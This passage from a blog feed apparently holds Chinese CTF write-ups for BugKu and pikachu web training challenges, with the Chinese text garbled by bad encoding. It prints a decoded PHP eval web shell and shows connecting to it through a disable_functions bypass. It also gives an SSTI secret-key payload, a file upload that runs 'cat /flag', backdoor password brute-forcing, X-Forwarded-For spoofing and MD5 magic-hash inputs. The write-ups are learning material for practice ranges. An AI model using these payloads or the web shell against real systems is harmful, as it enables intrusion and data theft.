FZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIsMCwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUikpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è§£ç ï¼ˆæˆ‘æ˜¯ä¸€æ­¥æ­¥ç”¨base64è§£ç çš„ï¼Œä¸»è¦æ˜¯æ‰¾åˆ°evalé‡Œé¢çš„å†…å®¹ï¼Œæ³¨æ„æ˜¯æœ‰ä¸€æ¬¡è§£ç ä¼šå‡ºç°ä¸¤æ®µphpä»£ç ï¼Œç¬¬äºŒæ®µæ‰æ˜¯è¦çš„æºç )ï¼Œä¸‹é¢ä»£ç è¿è¡Œåå³å¯è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// define(&#x27;njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT&#x27;,pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn);</span></span><br><span class="line"><span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>=<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$HbXdtGUkeEDlRgpwsarfnVYoTSKIcPvhCWjBizQLZxFMuymANqJO</span>.=<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$OlnDkzNeqvjKmYhMBISxJCuZfQRwLWHGFstUcAoXVyrbiETPadgp</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>=<span class="string">&quot;WtCxsqEuLNTSGRkVfZKHjUYPIognBiFhrbyOXacAelmwpJdzvQDMFbRYnLeWuGTKsNZvOpcgErtXBxCQljVfDwSmyqHikPMzdJaIoAhUXh9zqgiGRMfdp2fnqFaxaV9MqFYPcs5LvQPIAPd2kgJUq0pppe5opMGQN3vfa0NctMYzT1GNNrfKvF1uqrVxkZPhpyNATyVtv1Admz0cAsv2tFzxJV9AT1GrF3PbwsPIqyGdH2Pow2bacTn=&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$IoceCnqVKOFkrlRjUPEdNhAuSMJBzmGvTLytisgpZYbQXHfDwWxa</span>(<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>*<span class="number">2</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>),<span class="variable">$DcbyPNpYSKuECvekIVZlOQFTMwgXinAfaoHdzqhGWRrLsmJBjUtx</span>(<span class="variable">$HfuSgMBOxhovrtnmYzkUGFEZsiDXyJIlbKCWjpVLPTwcqeaNARdQ</span>,<span class="number">0</span>,<span class="variable">$kcwKbSghWizYEuAGDOTFaHXQRtnLyBlJpCImejsrNvZqPUVxfMdo</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸­å›½èšå‰‘è¿æ¥ï¼ˆä½¿ç”¨æ’ä»¶disable_functionsï¼‰ï¼Œè¿æ¥åå‘ç°åªèƒ½çœ‹htmlç›®å½•ä¸‹çš„ä¸œè¥¿ã€‚</p><p><img src="https://s2.loli.net/2022/04/25/ti2E6mdAYTXsfqB.png" alt="getshell1.png"></p><p>ç”¨èšå‰‘è¿æ¥ .antproxy.php</p><p><img src="https://s2.loli.net/2022/04/25/BQ28ELpHonSjU3O.png" alt="getshell2.png"></p><p>æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/25/jYuGEBn4b382MNH.png" alt="getshell3.png"></p><p><img src="https://s2.loli.net/2022/04/25/ucUkJHMwlmhVyXZ.png" alt="getshell4.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•1</title>
      <link href="/2022/04/24/BugKu-Web1/"/>
      <url>/2022/04/24/BugKu-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•1"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•1" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•1"></a>BugKu Web åˆ·é¢˜è®°å½•1</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.secpulse.com/archives/137663.html">BugKu-Web-wp1</a></p><p><a href="https://www.secpulse.com/archives/140522.html">BugKu-Web-wp2</a></p><p><a href="https://www.secpulse.com/archives/146728.html">BugKu-Web-wp3</a></p><p><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p></blockquote><h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h2><p>F12æŸ¥çœ‹æºç </p><p><img src="https://s2.loli.net/2022/04/24/XbFRket7Y6Kl4C8.png" alt="SSTI1.png"></p><p>è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17350/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/l3KfC9Ap51EM8vr.png" alt="SSTI11.png"></p><h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h2><p><img src="https://s2.loli.net/2022/04/24/7d1ugKRv3ZNfxas.png" alt="SSTI2.png"></p><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>åˆ›å»º111.txtå¹¶è¾“å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ–‡ä»¶åä¸º111.jpgåä¸Šä¼ æ–‡ä»¶å³å¯å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p><h2 id="æ»‘ç¨½"><a href="#æ»‘ç¨½" class="headerlink" title="æ»‘ç¨½"></a>æ»‘ç¨½</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p><p>F12åï¼Œctrl+fæœç´¢flagå³å¯</p><p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p><h2 id="è®¡ç®—å™¨"><a href="#è®¡ç®—å™¨" class="headerlink" title="è®¡ç®—å™¨"></a>è®¡ç®—å™¨</h2><p>F12ï¼Œä¿®æ”¹é•¿åº¦é™åˆ¶ï¼Œéšåè¾“å…¥æ­£ç¡®è®¡ç®—ç»“æœå³å¯ã€‚</p><p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p><h2 id="çŸ›ç›¾"><a href="#çŸ›ç›¾" class="headerlink" title="çŸ›ç›¾"></a>çŸ›ç›¾</h2><p>ç¬¬ä¸€ä¸ªæ¡ä»¶æ˜¯ä¸èƒ½ä¸ºæ•°å­—ï¼Œç¬¬äºŒä¸ªæ¡ä»¶æ˜¯&#x3D;&#x3D;æ¯”è¾ƒï¼Œå’Œæ•´å‹æ¯”è¾ƒæ˜¯ä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´å‹ï¼Œâ€™1adminâ€™åœ¨æ¯”è¾ƒæ—¶å€™ä¼šå˜æˆ1</p><p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>æŸ¥çœ‹æºä»£ç </p><p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p><p>æ”¾åˆ°htmlä¸­æ˜¾ç¤º</p><p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p><h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a href="#ä½ å¿…é¡»è®©ä»–åœä¸‹" class="headerlink" title="ä½ å¿…é¡»è®©ä»–åœä¸‹"></a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2><p>burp suiteæŠ“åŒ…</p><p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p><h2 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h2><p>å…³é”®åœ¨äºè¿™ä¸€å¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure><p>æ•…ä¼ å…¥args&#x3D;GLOBALS,æœ€åä¼šè¾“å‡ºâ€‹GLOBALS,flagå°±åœ¨å…¶ä¸­</p><p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p><h2 id="å¤´ç­‰èˆ±"><a href="#å¤´ç­‰èˆ±" class="headerlink" title="å¤´ç­‰èˆ±"></a>å¤´ç­‰èˆ±</h2><p>æŠ“åŒ…æŸ¥çœ‹å“åº”åŒ…</p><p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p><h2 id="ç½‘ç«™è¢«é»‘"><a href="#ç½‘ç«™è¢«é»‘" class="headerlink" title="ç½‘ç«™è¢«é»‘"></a>ç½‘ç«™è¢«é»‘</h2><p>æç¤ºæœ‰æ— åé—¨ï¼Œç”¨å¾¡å‰‘æ‰«æä¸€ä¸‹å‘ç°shell.php</p><p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p><p>è¿›å…¥åå‘ç°éœ€è¦è¾“å…¥å¯†ç </p><p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p><p>ç”¨burpçˆ†ç ´è·å¾—å¯†ç </p><p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p><p>è¾“å…¥å¯†ç åå¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p><h2 id="æœ¬åœ°ç®¡ç†å‘˜"><a href="#æœ¬åœ°ç®¡ç†å‘˜" class="headerlink" title="æœ¬åœ°ç®¡ç†å‘˜"></a>æœ¬åœ°ç®¡ç†å‘˜</h2><p>F12æŸ¥çœ‹å‘ç°ç¼–ç </p><p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p><p>æ”¾è¿›base64ä¸­è§£å¯†å¾—åˆ°å¯†ç ï¼Œç”±äºæ˜¯ç®¡ç†å‘˜ï¼Œæ•…çŒœæµ‹è´¦æˆ·ä¸ºadmin</p><p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p><p>è¾“å…¥åå‘ç°ipè¢«ban</p><p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p><p>ä½¿ç”¨burpè¿›è¡Œipä¼ªé€ è·å–flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p><h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><p>F12æŸ¥çœ‹å¾—åˆ°ä»£ç </p><p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p><p>ç”¨ä»¥ä¸‹ä»£ç è§£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p><p>è¾“å…¥å¯†ç å³å¯å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>æ ¹æ®æç¤ºï¼ˆz?????ï¼‰çŒœæµ‹ä¸ºzå¼€å¤´çš„6ä½å¯†ç ï¼Œç›´æ¥ç”¨burpçˆ†ç ´ï¼ˆæ³¨æ„åŠ ä¸Šæ ‡è®°code: â€˜bugku10000â€™ï¼Œä¸ç„¶æ‰€æœ‰è¿”å›å­—æ®µéƒ½ç›¸åŒï¼‰</p><p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>ä½¿ç”¨æ‰«æå·¥å…·æ‰«æï¼ˆ<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>ï¼‰</p><p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p><p>è¾“å…¥&#x2F;index.php.bakåç¼€ä¸‹è½½å¾—åˆ°æºæ–‡ä»¶index.php.bak</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr è·å¾—URIä»&#x27;?&#x27;å¾€å(åŒ…æ‹¬&#x27;?&#x27;)çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr å»æ‰&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//æŠŠ$strä¸­çš„æ‰€æœ‰keyå»æ‰</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//æŠŠå­—ç¬¦ä¸²è§£æåˆ°å˜é‡é‡Œ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1å’Œkey2çš„md5å€¼ç›¸ç­‰ä½†äºŒè€…ä¸æ’ç­‰</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;å–å¾—flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p><p>ä»‹ç»ä¸€æ‰¹md5æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachué¶åœºåˆ·é¢˜è®°å½•</title>
      <link href="/2022/04/21/pikachu/"/>
      <url>/2022/04/21/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-pikachué¶åœºè®°å½•"><a href="#CTF-Web-pikachué¶åœºè®°å½•" class="headerlink" title="CTF Web pikachué¶åœºè®°å½•"></a>CTF Web pikachué¶åœºè®°å½•</h1><blockquote><p>ç®€å•è®°å½•ä¸‹pikachué¶åœºåˆ·é¢˜å†ç¨‹</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://www.bilibili.com/video/BV1Qh411D7mN?share_source=copy_web">å…¨ç¨‹è®²è§£è§†é¢‘</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachué¶åœºwp1</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/107880269?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165020809116780255213643%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165020809116780255213643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107880269.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu&spm=1018.2226.3001.4187">pikachué¶åœºwp2</a></p></blockquote><h2 id="é¶åœºç¯å¢ƒé…ç½®"><a href="#é¶åœºç¯å¢ƒé…ç½®" class="headerlink" title="é¶åœºç¯å¢ƒé…ç½®"></a>é¶åœºç¯å¢ƒé…ç½®</h2><blockquote><p>å¯ä»¥å‚ç…§æœ¬ç¯‡åšå®¢ï¼š<a href="https://www.webxlab.net/article/detail/OmAE5oMAar">https://www.webxlab.net/article/detail/OmAE5oMAar</a></p></blockquote><p>åˆå§‹ç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/21/UPZhWdKINOnD8V7.png" alt="brief_intro.png"></p><h2 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç 